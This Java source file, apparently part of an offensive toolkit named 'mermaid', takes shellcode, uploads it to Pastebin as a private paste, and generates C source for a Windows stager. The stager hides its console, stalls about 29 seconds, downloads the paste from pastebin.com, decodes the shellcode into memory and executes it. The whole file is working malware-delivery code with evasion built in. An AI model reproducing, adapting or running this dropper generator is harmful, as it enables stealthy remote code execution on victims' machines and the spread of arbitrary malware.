package net.jlxip.mermaid.exploits;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.regex.Pattern;

import javax.swing.JOptionPane;

public class MerCodeBin {
	private static final String PastebinAPIURL = "http://pastebin.com/api/api_post.php";
	private static final String ContentType = "application/x-www-form-urlencoded";
	private static final String UserAgent = "Mozilla/4.0";
	
	private static final Pattern Pslash = Pattern.compile(Pattern.quote("/"));
	
	public static Boolean generate(File file, String SHELLCODE, String PastebinAPIDevKey) {
		String page = "";
		
		try {
			final String query = "api_option=paste&api_dev_key="+PastebinAPIDevKey+"&api_paste_code="+SHELLCODE+"&api_paste_private=1&api_paste_expire_date=N";
			
			URL url = new URL(PastebinAPIURL);
			HttpURLConnection.setFollowRedirects(false);
			HttpURLConnection con = (HttpURLConnection)url.openConnection();
			con.setRequestMethod("POST");
			con.setRequestProperty("Content-length", String.valueOf(query.length())); 
			con.setRequestProperty("Content-Type", ContentType); 
			con.setRequestProperty("User-Agent", UserAgent);
			con.setDoOutput(true); 
			con.setDoInput(true);
			
			DataOutputStream output = new DataOutputStream(con.getOutputStream());
			output.writeBytes(query);
			output.close();
			
			InputStreamReader input = new InputStreamReader(con.getInputStream(), "UTF-8");	// Leemos la salida de la página codificada en UTF-8
			for(int c = input.read(); c != -1; c = input.read()) {
				page += (char)c;
			}
			input.close();
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		switch(page) {
			case "Bad API request, invalid api_dev_key":
				JOptionPane.showMessageDialog(null, "Invalid Pastebin API dev key.");
				return false;
			case "Bad API request, IP blocked":
				JOptionPane.showMessageDialog(null, "Pastebin has blocked your IP.");
				return false;
			case "Bad API request, maximum number of 25 unlisted pastes for your free account":
				JOptionPane.showMessageDialog(null, "You have reached the amount of 25 unlimited pastes for your free account of Pastebin.");
				return false;
			case "Bad API request, api_paste_code was empty":
				JOptionPane.showMessageDialog(null, "Invalid shellcode.");
				return false;
		}
		
		final String PASTEBIN_CODE = Pslash.split(page)[Pslash.split(page).length-1];
		final int SHELLCODE_LENGTH = SHELLCODE.length() + 1024;	// +1024 for the headers
		
		try {
			FileWriter fw = new FileWriter(file);
			PrintWriter pw = new PrintWriter(fw);
			
			pw.println("#include <stdio.h>");
			pw.println("#include <winsock2.h>");
			pw.println("#define _WIN32_WINNT 0x0500");
			pw.println("main(){");
			pw.println("	ShowWindow(GetConsoleWindow(), SW_HIDE);");
			
			pw.println("	int retTime = time(0) + 29;");
            pw.println("	while(time(0)<retTime);");
			
			pw.println("	WSADATA WsaDat;");	// INICIALIZAR WINSOCK
			pw.println("	if(WSAStartup(MAKEWORD(2,2),&WsaDat)!=0) {");
			pw.println("		WSACleanup();");
			pw.println("		return 0;");
			pw.println("	}");
			pw.println("	SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);");	// CREANDO EL SOCKET
			pw.println("	if(Socket==INVALID_SOCKET) {");
			pw.println("		WSACleanup();");
			pw.println("		return 0;");
			pw.println("	}");
			pw.println("	struct hostent *host;");	// // RESOLVER LA DIRECCIÓN IP DEL DNS
			pw.println("	if((host=gethostbyname(\"pastebin.com\"))==NULL) {");
			pw.println("		WSACleanup();");
			pw.println("		return 0;");
			pw.println("	}");
			pw.println("	SOCKADDR_IN SockAddr;");	// INICIAR SOCKET
			pw.println("	SockAddr.sin_port=htons(80);");
			pw.println("	SockAddr.sin_family=AF_INET;");
			pw.println("	SockAddr.sin_addr.s_addr=*((unsigned long*)host->h_addr);");
			pw.println("	if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr))!=0) {");	// INTENTANDO CONECTAR CON EL SERVIDOR
			pw.println("		WSACleanup();");
			pw.println("		return 0;");
			pw.println("	}");
			pw.println("    char message[]=\"GET /raw/"+PASTEBIN_CODE+" HTTP/1.1\\r\\nHost: pastebin.com\\r\\nUser-Agent: Mozilla/4.0\\r\\n\\r\\n\";");	// PETICIÓN HTTP
			pw.println("    if( send(Socket, message, strlen(message), 0) < 0) {");
			pw.println("        WSACleanup();");
			pw.println("        return 0;");
			pw.println("    }");
			
			pw.println("	char buffer["+SHELLCODE_LENGTH+"];");
			pw.println("	memset(buffer,0,"+(SHELLCODE_LENGTH-1)+");");
			pw.println("	int inDataLength=recv(Socket,buffer,"+SHELLCODE_LENGTH+",0);");
			
			pw.println("	char *token;");
			pw.println("	char *delimiter=\"\\n\";");
			pw.println("	token = strtok(buffer, delimiter);");
			pw.println("	for(int i=0;i<15;i++) token = strtok(NULL, delimiter);");
			
			pw.println("	shutdown(Socket,SD_SEND);");	// APAGAR EL SOCKET
			pw.println("	closesocket(Socket);");	// CERRAR EL SOCKET
			pw.println("	WSACleanup();");	// LIMPIAR WINSOCK
			
			// THE BLOCK OF CODE BELOW IS A MODIFICATION OF THIS: https://goo.gl/gnhwPl
			pw.println("	int v;");
			pw.println("	int length = 0;");
			pw.println("	unsigned char* ready = (char*)malloc(strlen(token)/4);");
			pw.println("	for(int i=0;i<strlen(token);i=i+4) {");
			pw.println("		char thisChain[5];");
			pw.println("		sprintf(thisChain, \"%c%c%c%c\", token[i], token[i+1], token[i+2], token[i+3]);");
			pw.println("		sscanf(thisChain, \"\\\\x%02x\", &v);");
			pw.println("		ready[length] = v;");
			pw.println("		length++;");
			pw.println("	}");
			
			// LAUNCH THE SHELLCODE
			pw.println("	int (*run)() = (int(*)())ready;");
			pw.println("	run();");
			
			pw.println("	return 0;");
			pw.println("}");
			
			pw.close();
			fw.close();
		} catch(IOException ioe) {
			ioe.printStackTrace();
		}
		
		return true;
	}
}
